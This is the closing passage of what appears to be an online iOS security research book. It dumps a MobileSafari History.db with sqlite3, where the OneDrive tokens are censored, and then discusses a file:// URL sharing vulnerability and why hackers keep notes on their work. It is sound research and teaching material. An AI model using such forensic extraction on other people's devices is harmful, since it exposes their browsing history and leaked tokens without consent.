<div class="highlight"><pre><span></span><code># sqlite3 ~/Downloads/History.db
SQLite version 3.36.0 2021-06-18 18:58:49
Enter &quot;.help&quot; for usage hints.
sqlite&gt; .dump
PRAGMA foreign_keys=OFF;
BEGIN TRANSACTION;
CREATE TABLE history_items (id INTEGER PRIMARY KEY AUTOINCREMENT,url TEXT NOT NULL UNIQUE,domain_expansion TEXT NULL,visit_count INTEGER NOT NULL,daily_visit_counts BLOB NOT NULL,weekly_visit_counts BLOB NULL,autocomplete_triggers BLOB NULL,should_recompute_derived_visit_counts INTEGER NOT NULL,visit_count_score INTEGER NOT NULL);
INSERT INTO history_items VALUES(1206,&#39;https://www.theiphonewiki.com/w/index.php?search=Cydia%20Impactor&amp;title=Special%3ASearch&#39;,&#39;theiphonewiki&#39;,1,X&#39;14000000&#39;,NULL,NULL,0,20);
INSERT INTO history_items VALUES(1207,&#39;https://onedrive.live.com/?cid=STUFFYOUSHOULDNOTSEE&amp;authkey=SOMETHINGELSESENSITIVE&#39;,&#39;onedrive.live&#39;,1,X&#39;14000000&#39;,NULL,NULL,0,20);
INSERT INTO history_items VALUES(1209,&#39;http://www.cydiaimpactor.com/&#39;,&#39;cydiaimpactor&#39;,3,X&#39;34000000&#39;,NULL,NULL,0,52);
.
.
</code></pre></div>
<p>Clearly this demonstrates that the victim had visited the iPhone Wiki and Cydia Impactor websites, and also had used Microsoft One Drive.  Critical tokens were also leaked but have been censored from the above verbose dump.</p>
<h2 id="documenting-the-journey">Documenting the Journey</h2>
<p>We have just scratched the surface of <code>MobileSafari</code>.  In a way we have half-cheated.  We did not find a zero day from our own efforts but we did find interesting information.  When correlated to an actual exploit we can see what we have done would have taken us a step closer to the exploit.
The item we found was that the <code>MobileSafari</code> had opened a sensitive file path which we discovered.  A separate vulnerability is that it allowed sharing of items with the <code>file://</code> URL schema; it is not something we figured out.  But if we had, then we would have had a reasonable stab at a hack because we would know what URL path to supply to the <code>file://</code> URL.</p>
<p>When we explore a system, it is worthwhile documenting our journey as we go.  We have seen that merely by running commands in a fashion that send back the output to our Mac allows us to retain a record of what we found.  It is not much effort to wrap such analysis into a Markdown file with simple notes, and links to web resources.  These files naturally can be placed under version control.</p>
<p>Hacking is all about the details.  Sometimes our experiments are fruitless.  But if we have a good record of what we have done, then at a later point in time when we get another idea, we can work back through our notes and possible recommence a failed approach but with a new angle of attack.</p>
<p>When we are successful in creating a zero-day, often there is a write-up done after the event (for example when the bug has been fixed and customers have updated to using the fix).  Documenting the journey means we will have a valuable resource for writing a blog post, for example.</p>
                
              
              
                


              
            </article>
          </div>
        </div>
        
      </main>
      
        
<footer class="md-footer">
  
    <nav class="md-footer__inner md-grid" aria-label="Footer">
      
        
        <a href="../JailbreakSetup/" class="md-footer__link md-footer__link--prev" aria-label="Previous: Jailbreak Setup" rel="prev">
          <div class="md-footer__button md-icon">
            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11h12z"/></svg>
          </div>
          <div class="md-footer__title">
            <div class="md-ellipsis">
              <span class="md-footer__direction">
                Previous
              </span>
              Jailbreak Setup
            </div>
          </div>
        </a>
      
      
        
        <a href="../Leveraging/" class="md-footer__link md-footer__link--next" aria-label="Next: Leveraging Research" rel="next">
          <div class="md-footer__title">
            <div class="md-ellipsis">
              <span class="md-footer__direction">
                Next
              </span>
              Leveraging Research
            </div>
          </div>
          <div class="md-footer__button md-icon">
            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M4 11v2h12l-5.5 5.5 1.42 1.42L19.84 12l-7.92-7.92L10.5 5.5 16 11H4z"/></svg>
          </div>
        </a>
      
    </nav>
  
  <div class="md-footer-meta md-typeset">
    <div class="md-footer-meta__inner md-grid">
      <div class="md-footer-copyright">
        
        
          Made with
          <a href="https://squidfunk.github.io/mkdocs-material/" target="_blank" rel="noopener">
            Material for MkDocs
          </a>
        
        
      </div>
      
    </div>
  </div>
</footer>
      
    </div>
    <div class="md-dialog" data-md-component="dialog">
      <div class="md-dialog__inner md-typeset"></div>
    </div>
    <script id="__config" type="application/json">{"base": "..", "features": [], "translations": {"clipboard.copy": "Copy to clipboard", "clipboard.copied": "Copied to clipboard", "search.config.lang": "en", "search.config.pipeline": "trimmer, stopWordFilter", "search.config.separator": "[\\s\\-]+", "search.placeholder": "Search", "search.result.placeholder": "Type to start searching", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.term.missing": "Missing", "select.version.title": "Select version"}, "search": "../assets/javascripts/workers/search.fcfe8b6d.min.js", "version": null}</script>
    
    
      <script src="../assets/javascripts/bundle.b1047164.min.js"></script>
      
    
  </body>
</html>